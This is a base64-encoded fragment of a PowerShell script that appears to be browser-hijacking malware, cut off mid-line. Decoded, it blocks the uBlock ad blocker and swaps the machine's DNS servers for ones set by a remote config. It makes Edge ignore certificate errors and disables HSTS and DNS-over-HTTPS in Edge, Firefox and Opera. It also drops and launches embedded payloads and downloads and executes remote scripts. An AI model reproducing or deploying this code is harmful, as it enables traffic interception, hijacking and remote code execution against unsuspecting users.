ICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFtVc2VyMzJYXTo6U2hvd1dpbmRvdygkcHJvY2Vzcy5NYWluV2luZG93SGFuZGxlLCBbVXNlcjMyWF06OlNXX1NIT1cpIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIENsb3NlLUNocm9tZSAtcHJvY2VzcyAkcHJvY2Vzcw0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJDaHJvbWUgbm90IGZvdW5kIGF0OiAkcGF0aCINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgfSAtQXJndW1lbnRMaXN0ICR1cmwsICRpc0RlYnVnDQoNCiAgICByZXR1cm4gJGpvYg0KfQ0KDQpmdW5jdGlvbiBMYXVuY2hDaHJvbWVQdXNoZXMgew0KICAgICRhdXRvID0gVGVzdC1BdXRvc3RhcnQ7DQogICAgaWYgKCRzZXJ2ZXIucHVzaGVzRm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJTa2lwcGluZyBmdW5jdGlvbiBMYXVuY2hDaHJvbWVQdXNoZXMiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgew0KICAgICAgICAgICAgJGlzRGVidWcgPSBJc0RlYnVnDQogICAgICAgICAgICBPcGVuLUNocm9tZVdpdGhVcmwgLXVybCAkcHVzaCAtaXNEZWJ1ZyAkaXNEZWJ1Zw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCBMYXVuY2hDaHJvbWVQdXNoZXMpOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX2Nocm9tZV9wdXNoIHsNCiAgICBDb25maWd1cmVDaHJvbWVQdXNoZXMNCiAgICBMYXVuY2hDaHJvbWVQdXNoZXMNCn0NCg0KZnVuY3Rpb24gZG9fY2hyb21lX3VibG9jayB7DQogICAgJGtleXdvcmRzID0gQCgidUJsb2NrIikNCg0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSB7DQogICAgICAgICRjaHJvbWVEaXIgPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICJHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XEV4dGVuc2lvbnMiDQogICAgICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkY2hyb21lRGlyIC1QYXRoVHlwZSBDb250YWluZXIpIHsNCiAgICAgICAgICAgICAgICAkZXh0ZW5zaW9ucyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGNocm9tZURpciAtRGlyZWN0b3J5DQoNCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkZXh0ZW5zaW9uIGluICRleHRlbnNpb25zKSB7DQogICAgICAgICAgICAgICAgICAgICRtYW5GaWxlID0gY2hyb21ldWJsb2NrX0ZpbmRNYW5pZmVzdEZpbGUgLWZvbGRlciAkZXh0ZW5zaW9uLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgICAgIGlmICgkbWFuRmlsZSAtbmUgIiIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRmb3VuZEtleXdvcmQgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJG1hbmlmZXN0VmFsdWUgaW4gJGtleXdvcmRzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkbWFuRmlsZSAtUmF3DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRjb250ZW50IC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hbmlmZXN0VmFsdWUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmb3VuZEtleXdvcmQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRmb3VuZEtleXdvcmQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZXh0Rm9sZGVyTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCRleHRlbnNpb24uRnVsbE5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdEFsbCAtZXh0TmFtZSAkZXh0Rm9sZGVyTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGZvbGRlcg0KICAgICkNCg0KICAgICRyZXN1bHQgPSAiIg0KDQogICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkZm9sZGVyIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBpZiAoLW5vdCAoJF8uUFNJc0NvbnRhaW5lcikpIHsNCiAgICAgICAgICAgIGlmICgkXy5OYW1lIC1lcSAibWFuaWZlc3QuanNvbiIpIHsNCiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJF8uRnVsbE5hbWUNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlaWYgKCRfLk5hbWUgLW5vdGluIEAoJy4nLCAnLi4nKSkgew0KICAgICAgICAgICAgJHJlc3VsdCA9IGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIC1mb2xkZXIgJF8uRnVsbE5hbWUNCiAgICAgICAgICAgIGlmICgkcmVzdWx0IC1uZSAiIikgew0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCg0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0QWxsIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGV4dE5hbWUNCiAgICApDQoNCiAgICBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0IC1leHROYW1lICRleHROYW1lIC1icm93c2VyICJHb29nbGVcQ2hyb21lIg0KfQ0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfUHJvY2Vzc01hbmlmZXN0IHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGV4dE5hbWUsDQogICAgICAgIFtzdHJpbmddJGJyb3dzZXINCiAgICApDQoNCiAgICAkcmVnUGF0aCA9ICJIS0xNOlxTT0ZUV0FSRVxQb2xpY2llc1wkYnJvd3NlclxFeHRlbnNpb25JbnN0YWxsQmxvY2tsaXN0Ig0KICAgIA0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHJlZ1BhdGgpKSB7DQogICAgICAgIE5ldy1JdGVtIC1QYXRoICRyZWdQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgfQ0KICAgIA0KICAgICRyZWdLZXlJbmRleCA9IDENCiAgICBkbyB7DQogICAgICAgICRrZXlOYW1lID0gIiRyZWdLZXlJbmRleCINCiAgICAgICAgJHZhbCA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGggLU5hbWUgJGtleU5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgaWYgKCR2YWwgLWVxICRleHROYW1lKSB7DQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgfQ0KICAgICAgICAkcmVnS2V5SW5kZXgrKw0KICAgIH0gdW50aWwgKC1ub3QgKFRlc3QtUGF0aCAiJHJlZ1BhdGhcJGtleU5hbWUiKSkNCg0KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGggLU5hbWUgJGtleU5hbWUgLVZhbHVlICRleHROYW1lDQp9DQoNCmZ1bmN0aW9uIFNldC1EbnNTZXJ2ZXJzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHByaW1hcnlEbnNTZXJ2ZXIsDQogICAgICAgIFtzdHJpbmddJHNlY29uZGFyeURuc1NlcnZlcg0KICAgICkNCg0KICAgIHRyeSB7DQogICAgICAgICMgR2V0IG5ldHdvcmsgYWRhcHRlcnMgdGhhdCBhcmUgSVAtZW5hYmxlZA0KICAgICAgICAkbmV0d29ya0FkYXB0ZXJzID0gR2V0LU5ldEFkYXB0ZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5TdGF0dXMgLWVxICdVcCcgLWFuZCAkXy5JbnRlcmZhY2VEZXNjcmlwdGlvbiAtbm90bGlrZSAnKlZpcnR1YWwqJyB9DQoNCiAgICAgICAgZm9yZWFjaCAoJGFkYXB0ZXIgaW4gJG5ldHdvcmtBZGFwdGVycykgew0KICAgICAgICAgICAgIyBTZXQgRE5TIHNlcnZlcnMgdXNpbmcgU2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3MgY21kbGV0DQogICAgICAgICAgICBTZXQtRG5zQ2xpZW50U2VydmVyQWRkcmVzcyAtSW50ZXJmYWNlQWxpYXMgJGFkYXB0ZXIuTmFtZSAtU2VydmVyQWRkcmVzc2VzIEAoJHByaW1hcnlEbnNTZXJ2ZXIsICRzZWNvbmRhcnlEbnNTZXJ2ZXIpIC1Db25maXJtOiRmYWxzZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICB3cml0ZWRiZyAiU3VjY2Vzc2Z1bGx5IHNldCBETlMgc2VydmVycyBmb3IgYWRhcHRlcjogJCgkYWRhcHRlci5JbnRlcmZhY2VEZXNjcmlwdGlvbikiDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkOiAkXyINCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGRvX2Ruc21hbiB7DQogICAgU2V0LUROU1NlcnZlcnMgLVByaW1hcnlETlNTZXJ2ZXIgJHNlcnZlci5wcmltYXJ5RG5zIC1TZWNvbmRhcnlETlNTZXJ2ZXIgJHNlcnZlci5zZWNvbmRhcnlEbnMNCn0NCg0KZnVuY3Rpb24gZG9fZWRnZSB7DQogICAgJHBhdGhzID0gQCgNCiAgICAgICAgIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxFZGdlIiwNCiAgICAgICAgIkhLQ1U6XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxFZGdlIg0KICAgICkNCg0KICAgIGZvcmVhY2ggKCRlZGdlS2V5UGF0aCBpbiAkcGF0aHMpIA0KICAgIHsNCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZWRnZUtleVBhdGgpKSB7DQogICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkZWRnZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJGNvbW1hbmRMaW5lUGF0aCA9IEpvaW4tUGF0aCAkZWRnZUtleVBhdGggIkNvbW1hbmRMaW5lIg0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjb21tYW5kTGluZVBhdGgpKSB7DQogICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkY29tbWFuZExpbmVQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGNvbW1hbmRMaW5lUGF0aCAtTmFtZSAiKERlZmF1bHQpIiAtVmFsdWUgIi0taWdub3JlLWNlcnRpZmljYXRlLWVycm9ycyAtLWRpc2FibGUtcXVpYyAtLWRpc2FibGUtaHN0cyINCiAgICAgICAgDQogICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGVkZ2VLZXlQYXRoIC1OYW1lICJEbnNPdmVySHR0cHMiIC1WYWx1ZSAib2ZmIg0KDQogICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGVkZ2VLZXlQYXRoIC1OYW1lICJJZ25vcmVDZXJ0aWZpY2F0ZUVycm9ycyIgLVZhbHVlIDENCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gRW1iZWRkaW5nTmFtZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRuYW1lDQogICAgKQ0KICAgICRmb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgIHJldHVybiBKb2luLVBhdGggLVBhdGggJGZvbGRlciAtQ2hpbGRQYXRoICRuYW1lDQp9DQoNCmZ1bmN0aW9uIERvSW50ZXJuYWxFbWJlZGRpbmdzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFthcnJheV0kbmFtZXMsIFthcnJheV0kZGF0YXMsICRmb3JjZSwgJG5hbWUNCiAgICApDQoNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkZm9yY2UgLW5lICRmYWxzZSAtYW5kICRhdXRvIC1lcSAkdHJ1ZSkNCiAgICB7DQogICAgICAgIHdyaXRlZGJnICJTa2lwcGluZyBmdW5jdGlvbiBEb0ludGVybmFsRW1iZWRkaW5ncyAoJG5hbWUpIg0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkbmFtZXMuTGVuZ3RoOyAkaSsrKSB7DQogICAgICAgICAgICAkbmFtZSA9ICRuYW1lc1skaV0NCiAgICAgICAgICAgICRkYXRhID0gJGRhdGFzWyRpXQ0KICAgICAgICAgICAgJGZpbGUgPSBFbWJlZGRpbmdOYW1lKCRuYW1lKQ0KICAgICAgICAgICAgQ3VzdG9tRGVjb2RlIC1pbkNvbnRlbnQgJGRhdGEgLW91dEZpbGUgJGZpbGUNCiAgICAgICAgICAgIEludm9rZS1JdGVtICRmaWxlDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgIHdyaXRlZGJnICJBbiBlcnJvciBvY2N1cnJlZCAoRG9Gcm9udCk6ICRfIg0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBEb0Zyb250IHsNCiAgICBEb0ludGVybmFsRW1iZWRkaW5ncyAtbmFtZXMgJHhmcm9udF9uYW1lIC1kYXRhcyAkeGZyb250IC1mb3JjZSAkc2VydmVyLmZyb250Rm9yY2UgLW5hbWUgImZyb250Ig0KfQ0KDQpmdW5jdGlvbiBEb0VtYmVkZGluZ3Mgew0KICAgIERvSW50ZXJuYWxFbWJlZGRpbmdzIC1uYW1lcyAkeGVtYmVkX25hbWUgLWRhdGFzICR4ZW1iZWQgLWZvcmNlICRzZXJ2ZXIuZW1iZWRkaW5nc0ZvcmNlIC1uYW1lICJlbWJlZGRpbmdzIg0KfQ0KDQpmdW5jdGlvbiBkb19lbWJlZGRpbmdzIHsNCiAgICBEb0Zyb250DQogICAgRG9FbWJlZGRpbmdzDQp9DQoNCg0KZnVuY3Rpb24gZG9fZXh0cmF1cGRhdGUoKSB7DQogICAgaWYgKC1ub3QgJHNlcnZlci5leHRyYVVwZGF0ZSl7DQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICAkdGltZW91dCA9IFtkYXRldGltZV06OlV0Y05vdy5BZGRNaW51dGVzKDEpDQogICAgJGRlbGF5ID0gNQ0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheQ0KICAgIA0KICAgIHdoaWxlIChbZGF0ZXRpbWVdOjpVdGNOb3cgLWx0ICR0aW1lb3V0KSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkcmVzcG9uc2UgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRzZXJ2ZXIuZXh0cmFVcGRhdGVVcmwgLVVzZUJhc2ljUGFyc2luZyAtTWV0aG9kIEdldA0KDQogICAgICAgICAgICBpZiAoJHJlc3BvbnNlLlN0YXR1c0NvZGUgLWVxIDIwMCkgew0KICAgICAgICAgICAgICAgICRzY3JpcHRCbG9jayA9IFtTY3JpcHRCbG9ja106OkNyZWF0ZSgkcmVzcG9uc2UuQ29udGVudCkNCiAgICAgICAgICAgICAgICAuICRzY3JpcHRCbG9jaw0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gZG93bmxvYWQgb3IgZXhlY3V0ZSB0aGUgc2NyaXB0OiAkXyINCiAgICAgICAgfQ0KDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheQ0KICAgIH0NCiAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIGRvd25sb2FkIHRoZSBzY3JpcHQgd2l0aGluIHRoZSBhbGxvdHRlZCB0aW1lLiINCn0NCg0KZnVuY3Rpb24gZG9fZmlyZWZveCANCnsNCiAgICB0cnkgDQogICAgew0KICAgICAgICBTZXQtRmlyZWZveFJlZ2lzdHJ5IC1LZXlQYXRocyBAKA0KICAgICAgICAgICAgJ1NPRlRXQVJFXFBvbGljaWVzXE1vemlsbGFcRmlyZWZveFxETlNPdmVySFRUUFMnLA0KICAgICAgICAgICAgJ1NPRlRXQVJFXFBvbGljaWVzXE1vemlsbGFcRmlyZWZveFxETlNPdmVySFRUUFMnDQogICAgICAgICkgLVZhbHVlTmFtZXMgQCgnRW5hYmxlZCcsICdMb2NrZWQnKSAtVmFsdWVzIEAoMCwgMSkNCiAgICB9DQogICAgY2F0Y2ggDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiRmFpbGVkIHRvIHNldCBmaXJlZm94IHJlZ2lzdHJ5OiAkXyINCiAgICB9DQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIA0KICAgIHsNCiAgICAgICAgdHJ5IA0KICAgICAgICB7DQogICAgICAgICRwYXRoID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAiTW96aWxsYVxGaXJlZm94XFByb2ZpbGVzXHVzZXIuanMiDQoNCiAgICAgICAgICAgICRVc2VySlNDb250ZW50ID0gJ3VzZXJfcHJlZigibmV0d29yay50cnIubW9kZSIsIDUpOycNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCEoVGVzdC1QYXRoIC1QYXRoICRwYXRoIC1QYXRoVHlwZSBMZWFmKSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHBhdGggLUl0ZW1UeXBlIEZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgICAgICBBZGQtQ29udGVudCAtUGF0aCAkcGF0aCAtVmFsdWUgJFVzZXJKU0NvbnRlbnQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCANCiAgICAgICAgew0KICAgICAgICAgICAgd3JpdGVkYmcgIkZhaWxlZCB0byB3cml0ZSB0byB1c2VyLmpzIGZpbGU6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIFNldC1GaXJlZm94UmVnaXN0cnkgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ1tdXSRLZXlQYXRocywNCiAgICAgICAgW3N0cmluZ1tdXSRWYWx1ZU5hbWVzLA0KICAgICAgICBbaW50W11dJFZhbHVlcw0KICAgICkNCg0KICAgICRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU3RvcCcNCiAgICAkcmVnS2V5ID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeV06OkxvY2FsTWFjaGluZQ0KDQogICAgdHJ5IHsNCiAgICAgICAgZm9yZWFjaCAoJGkgaW4gMC4uKCRLZXlQYXRocy5MZW5ndGggLSAxKSkgew0KICAgICAgICAgICAgJGtleSA9ICRyZWdLZXkuT3BlblN1YktleSgkS2V5UGF0aHNbJGldLCAkdHJ1ZSkNCiAgICAgICAgICAgIGlmICgka2V5IC1lcSAkbnVsbCkgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gb3BlbiByZWdpc3RyeSBrZXk6ICQoJEtleVBhdGhzWyRpXSkiDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICRrZXkuU2V0VmFsdWUoJFZhbHVlTmFtZXNbJGldLCAkVmFsdWVzWyRpXSwgW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeVZhbHVlS2luZF06OkRXb3JkKQ0KICAgICAgICAgICAgJGtleS5DbG9zZSgpDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICB3cml0ZWRiZyAiRXJyb3IgYWNjZXNzaW5nIG9yIG1vZGlmeWluZyByZWdpc3RyeTogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBkb19vcGVyYQ0Kew0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdvcGVyYV9jcmFzaHJlcG9ydGVyLmV4ZScsICdvcGVyYS5leGUnKSkNCg0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSB7DQogICAgICAgICRwYXRoID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAnT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXExvY2FsIFN0YXRlJw0KDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRwYXRoIC1QYXRoVHlwZSBMZWFmKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbmZpZ3VyZU9wZXJhSW50ZXJuYWwgLUZpbGVQYXRoICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG9jY3VycmVkIGluIE9wZXJhOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlT3BlcmFJbnRlcm5hbCB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJGZpbGVQYXRoDQogICAgKQ0KDQogICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLW9yICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1pc25vdCBbb2JqZWN0XSkgew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcyA9IEB7DQogICAgICAgICAgICAnbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgJ29wZXJhJyA9IEB7DQogICAgICAgICAgICAgICAgJ2RvaF9tb2RlJyA9ICdvZmYnDQogICAgICAgICAgICB9DQogICAgICAgICAgICAndGVtcGxhdGVzJyA9ICIiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5tb2RlID0gJ29mZicNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMub3BlcmEgPSBAew0KICAgICAgICAgICAgJ2RvaF9tb2RlJyA9ICdvZmYnDQogICAgICAgIH0NCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMudGVtcGxhdGVzID0gIiINCiAgICB9DQoNCiAgICAkanNvblN0cmluZyA9ICRjb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVZhbHVlICRqc29uU3RyaW5nIC1FbmNvZGluZyBVVEY4IC1Gb3JjZQ0KDQogICAgd3JpdGVkYmcgIlN1Y2Nlc3NmdWxseSBjb25maWd1cmVkIE9wZXJhIHNldHRpbmdzIGluICRmaWxlUGF0aCINCn0NCg0KZnVuY3Rpb24gR2V0LUZpbGVOYW1lRnJvbVVyaSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmkNCiAgICApDQoNCiAgICAjIENyZWF0ZSBhIFVyaSBvYmplY3QNCiAgICAkdXJpT2JqZWN0ID0gW1N5c3RlbS5VcmldOjpuZXcoJHVyaSkNCg0KICAgICMgRXh0cmFjdCB0aGUgZmlsZSBuYW1lIGZyb20gdGhlIHBhdGggb2YgdGhlIFVSSQ0KICAgICRmaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCR1cmlPYmplY3QuQWJzb2x1dGVQYXRoKQ0KDQogICAgcmV0dXJuICRmaWxlTmFtZQ0KfQ0KDQpmdW5jdGlvbiBBZGQtUmFuZG9tRGlnaXRzVG9GaWxlbmFtZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRmaWxlTmFtZQ0KICAgICkNCg0KICAgICMgU3BsaXQgZmlsZW5hbWUgaW50byBiYXNlIGFuZCBleHRlbnNpb24NCiAgICAkYmFzZU5hbWUgPSAkZmlsZU5hbWUgLXJlcGxhY2UgJ1wuW14uXSskJywgJycNCiAgICAkZXh0ZW5zaW9uID0gJGZpbGVOYW1lIC1yZXBsYWNlICcuKlwuJywgJy4nDQoNCiAgICAjIEdlbmVyYXRlIGEgcmFuZG9tIG51bWJlciBiZXR3ZWVuIDEwMDAgYW5kIDk5OTkNCiAgICAkcmFuZG9tTnVtYmVyID0gR2V0LVJhbmRvbSAtTWluaW11bSAxMDAwIC1NYXhpbXVtIDk5OTkNCg0KICAgICMgQ29tYmluZSBiYXNlIG5hbWUsIHJhbmRvbSBudW1iZXIsIGFuZCBleHRlbnNpb24NCiAgICAkbmV3RmlsZU5hbWUgPSAiJGJhc2VOYW1lIiArICJfJHJhbmRvbU51bWJlciRleHRlbnNpb24iDQoNCiAgICByZXR1cm4gJG5ld0ZpbGVOYW1lDQp9DQoNCmZ1bmN0aW9uIFN0YXJ0LURvd25sb2FkQW5kRXhlY3V0ZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsDQogICAgICAgIFtzdHJpbmddJHRpdGxlDQogICAgKQ0KDQogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcw0KICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIGZvcm0NCiAgICAkZm9ybSA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybQ0KICAgICRmb3JtLlRleHQgPSAkdGl0bGUNCiAgICAkZm9ybS5TaXplID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5TaXplKDQwMCwgMjAwKQ0KICAgICRmb3JtLlN0YXJ0UG9zaXRpb24gPSAiQ2VudGVyU2NyZWVuIg0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgcHJvZ3Jlc3MgYmFyDQogICAgJHByb2dyZXNzQmFyID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Qcm9ncmVzc0Jhcg0KICAgICRwcm9ncmVzc0Jhci5NaW5pbXVtID0gMA0KICAgICRwcm9ncmVzc0Jhci5NYXhpbXVtID0gMTAwDQogICAgJHByb2dyZXNzQmFyLlN0ZXAgPSAxDQogICAgJHByb2dyZXNzQmFyLlZhbHVlID0gMA0KICAgICRwcm9ncmVzc0Jhci5XaWR0aCA9IDM1MA0KICAgICRwcm9ncmVzc0Jhci5IZWlnaHQgPSAzMA0KICAgICRwcm9ncmVzc0Jhci5Ub3AgPSA4MA0KICAgICRwcm9ncmVzc0Jhci5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHByb2dyZXNzQmFyKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgc3RhdHVzIGxhYmVsDQogICAgJHN0YXR1c0xhYmVsID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5MYWJlbA0KICAgICRzdGF0dXNMYWJlbC5UZXh0ID0gIkRvd25sb2F